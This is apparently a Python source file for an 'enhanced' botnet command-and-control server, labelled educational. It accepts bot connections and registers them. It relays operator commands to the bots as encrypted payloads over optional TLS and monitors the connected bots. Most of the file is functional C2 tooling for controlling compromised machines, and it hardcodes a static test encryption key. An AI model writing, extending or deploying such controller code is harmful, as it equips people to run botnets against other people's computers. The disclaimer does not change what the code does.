#!/usr/bin/env python3
"""
Enhanced Botnet Controller (Educational/Research Use Only)

This module provides a secure, modern botnet controller implementation with:
- Asyncio-based architecture for better scalability
- Secure AES encryption with proper key management
- Input validation and output sanitization
- Comprehensive logging with security considerations
- TLS support for encrypted communication
- Admin authentication
- Resource management and performance optimization

Author: Enhanced Implementation
License: Educational/Research Use Only
"""

import asyncio
import json
import datetime
import getpass
from typing import Optional, Dict, Any, Set

# Import our enhanced utilities
from utils import (
    SecureConfig,
    SecureEncryption,
    InputValidator,
    SecureLogger,
    BotTracker,
    TLSHelper,
    generate_bot_id,
    create_command_payload,
)


class BotnetController:
    """
    Enhanced botnet controller with async support and security features.
    """

    def __init__(self, config_file: Optional[str] = None):
        """
        Initialize the botnet controller.

        Args:
            config_file: Optional path to configuration file
        """
        self.config = SecureConfig(config_file)
        self.logger = SecureLogger(
            "BotnetController", self.config.get("LOG_LEVEL", "INFO")
        )
        self.encryption = SecureEncryption(self.config.get_encryption_key())
        self.validator = InputValidator()
        self.bot_tracker = BotTracker()

        self.host = self.config.get("SERVER_HOST", "127.0.0.1")
        self.port = self.config.get("SERVER_PORT", 9999)
        self.max_connections = self.config.get("MAX_CONNECTIONS", 100)

        self.active_connections: Set[asyncio.StreamWriter] = set()
        self.admin_authenticated = False
        self.ssl_context = TLSHelper.create_ssl_context(
            self.config.get("TLS_CERT_PATH"), self.config.get("TLS_KEY_PATH")
        )

        self.logger.info("BotnetController initialized")

    def _authenticate_admin(self) -> bool:
        """
        Authenticate admin user for controller access.

        Returns:
            True if authentication successful
        """
        admin_password = self.config.get("ADMIN_PASSWORD")
        if not admin_password:
            self.logger.warning(
                "No admin password configured. Skipping authentication."
            )
            return True

        try:
            entered_password = getpass.getpass("Admin password: ")
            if entered_password == admin_password:
                self.logger.info("Admin authentication successful")
                return True
            else:
                self.logger.warning("Admin authentication failed")
                return False
        except KeyboardInterrupt:
            return False

    async def handle_client(
        self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter
    ) -> None:
        """
        Handle individual bot connection.

        Args:
            reader: Async stream reader
            writer: Async stream writer
        """
        client_addr = writer.get_extra_info("peername")
        if not client_addr:
            await self._close_connection(writer)
            return

        ip_address = client_addr[0]

        # Validate IP address
        if not self.validator.validate_ip_address(ip_address):
            self.logger.warning(f"Invalid IP address: {ip_address}")
            await self._close_connection(writer)
            return

        # Check connection limit
        if len(self.active_connections) >= self.max_connections:
            self.logger.warning(f"Connection limit reached. Rejecting {ip_address}")
            await self._close_connection(writer)
            return

        self.active_connections.add(writer)
        bot_id = generate_bot_id(ip_address)

        try:
            # Send welcome message
            welcome_msg = b"[+] Welcome to enhanced botnet controller!\n"
            writer.write(welcome_msg)
            await writer.drain()

            # Register bot
            await self.bot_tracker.add_bot(
                bot_id, ip_address, {"user_agent": "enhanced_bot", "version": "2.0"}
            )

            reg_msg = f"Registered bot: {bot_id}\n".encode()
            writer.write(reg_msg)
            await writer.drain()

            self.logger.info(f"Bot connected: {bot_id} from {ip_address}")

            # Command handling loop
            await self._command_loop(bot_id, writer)

        except asyncio.CancelledError:
            self.logger.info(f"Connection cancelled for bot {bot_id}")
        except Exception as e:
            self.logger.error(f"Error handling bot {bot_id}: {str(e)}")
        finally:

            await self._cleanup_connection(bot_id, writer)

    async def _command_loop(self, bot_id: str, writer: asyncio.StreamWriter) -> None:
        """
        Handle command input and transmission to bot.

        Args:
            bot_id: Bot identifier
            writer: Stream writer for bot connection
        """
        while True:
            try:
                # Get command from admin (in real implementation, this would be
                # from a queue or API). For demo purposes, we'll use a simple
                # input with timeout
                cmd = await self._get_admin_command(bot_id)

                if not cmd or cmd.lower() in ["quit", "exit"]:
                    break

                # Validate and sanitize command
                sanitized_cmd = self.validator.sanitize_command(cmd)
                if not sanitized_cmd:
                    self.logger.warning(f"Invalid command rejected for bot {bot_id}")
                    continue

                # Create encrypted payload
                payload = create_command_payload(sanitized_cmd, self.encryption)
                payload_json = json.dumps(payload) + "\n"

                # Send command
                writer.write(payload_json.encode())
                await writer.drain()

                # Update tracking
                await self.bot_tracker.update_bot_activity(bot_id, "command_sent")

                # Log command (sanitized)
                self.logger.info(
                    f"Command sent to bot {bot_id}: {sanitized_cmd[:50]}..."
                )

                # Simulate command completion for tracking
                if sanitized_cmd.startswith("!"):
                    await self.bot_tracker.update_bot_activity(
                        bot_id, "command_completed"
                    )

            except asyncio.TimeoutError:
                # Periodic heartbeat
                await self.bot_tracker.update_bot_activity(bot_id, "ping")
            except Exception as e:
                self.logger.error(f"Error in command loop for bot {bot_id}: {str(e)}")
                break

    async def _get_admin_command(self, bot_id: str) -> Optional[str]:
        """
        Get command from admin interface.

        Args:
            bot_id: Bot identifier for context

        Returns:
            Command string or None
        """
        # In a real implementation, this would be replaced with:
        # - Web interface
        # - API endpoint
        # - Message queue
        # - Database polling

        # For demo purposes, simulate with a simple input

        try:
            # Use asyncio to make input non-blocking
            loop = asyncio.get_event_loop()
            cmd = await asyncio.wait_for(
                loop.run_in_executor(None, input, f"{bot_id}> "), timeout=30.0
            )
            return cmd.strip()
        except asyncio.TimeoutError:
            return None
        except KeyboardInterrupt:
            return "quit"

    async def _cleanup_connection(
        self, bot_id: str, writer: asyncio.StreamWriter
    ) -> None:
        """
        Clean up bot connection and tracking.

        Args:
            bot_id: Bot identifier
            writer: Stream writer to close
        """
        await self.bot_tracker.remove_bot(bot_id)
        self.active_connections.discard(writer)
        await self._close_connection(writer)
        self.logger.info(f"Bot disconnected: {bot_id}")

    async def _close_connection(self, writer: asyncio.StreamWriter) -> None:
        """
        Safely close a connection.

        Args:
            writer: Stream writer to close
        """
        try:
            if not writer.is_closing():
                writer.close()
                await writer.wait_closed()
        except Exception as e:
            self.logger.debug(f"Error closing connection: {str(e)}")

    async def start_server(self) -> None:
        """Start the botnet controller server."""
        # Authenticate admin
        if not self._authenticate_admin():
            self.logger.error("Admin authentication required")
            return

        self.admin_authenticated = True

        # Validate configuration
        if not self.validator.validate_port(self.port):
            self.logger.error(f"Invalid port number: {self.port}")
            return

        try:
            # Start server
            if self.ssl_context:
                server = await asyncio.start_server(
                    self.handle_client, self.host, self.port, ssl=self.ssl_context
                )
                self.logger.info(
                    f"Secure server listening on {self.host}:{self.port} (TLS enabled)"
                )
            else:
                server = await asyncio.start_server(
                    self.handle_client, self.host, self.port
                )
                self.logger.info(
                    f"Server listening on {self.host}:{self.port} (TLS disabled)"
                )

            # Start monitoring task
            monitor_task = asyncio.create_task(self._monitor_bots())

            async with server:
                try:
                    await server.serve_forever()
                except KeyboardInterrupt:
                    self.logger.info("Shutdown signal received")
                finally:
                    monitor_task.cancel()
                    await self._shutdown_server()

        except Exception as e:
            self.logger.error(f"Failed to start server: {str(e)}")

    async def _monitor_bots(self) -> None:
        """
        Monitor bot connections and provide periodic status updates.
        """
        try:
            while True:
                await asyncio.sleep(60)  # Monitor every minute

                active_bots = self.bot_tracker.get_active_bots()
                bot_count = len(active_bots)

                self.logger.info(
                    f"Status: {bot_count} active bots, "
                    f"{len(self.active_connections)} connections"
                )

                # Log summary statistics
                if bot_count > 0:
                    total_commands = sum(
                        bot["commands_sent"] for bot in active_bots.values()
                    )
                    total_completed = sum(
                        bot["commands_completed"] for bot in active_bots.values()
                    )
                    self.logger.debug(
                        f"Commands: {total_commands} sent, {total_completed} completed"
                    )

        except asyncio.CancelledError:
            self.logger.info("Bot monitoring stopped")

    async def _shutdown_server(self) -> None:
        """
        Gracefully shutdown the server and close all connections.
        """
        self.logger.info("Shutting down server...")

        # Close all active connections
        for writer in list(self.active_connections):
            await self._close_connection(writer)

        self.logger.info("Server shutdown complete")

    def get_status(self) -> Dict[str, Any]:
        """
        Get current server status.

        Returns:
            Dictionary with server status information
        """
        active_bots = self.bot_tracker.get_active_bots()

        return {
            "server_running": True,
            "admin_authenticated": self.admin_authenticated,
            "active_bots": len(active_bots),
            "active_connections": len(self.active_connections),
            "tls_enabled": self.ssl_context is not None,
            "uptime": datetime.datetime.now().isoformat(),
            "configuration": {
                "host": self.host,
                "port": self.port,
                "max_connections": self.max_connections,
                "log_level": self.config.get("LOG_LEVEL"),
            },
        }


# Legacy compatibility functions for existing tests
def encrypt(data: bytes) -> bytes:
    """Legacy encrypt function for backward compatibility."""
    # Use a static key for testing
    test_encryption = SecureEncryption(b"test_key_16byte!" + b"0" * 16)
    return test_encryption.encrypt(data)


def decrypt(data: bytes) -> bytes:
    """Legacy decrypt function for backward compatibility."""
    # Use a static key for testing
    test_encryption = SecureEncryption(b"test_key_16byte!" + b"0" * 16)
    return test_encryption.decrypt(data)


async def main():
    """Main entry point for the botnet controller."""
    controller = BotnetController()
    await controller.start_server()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nShutdown completed.")
    except Exception as e:
        print(f"Fatal error: {e}")
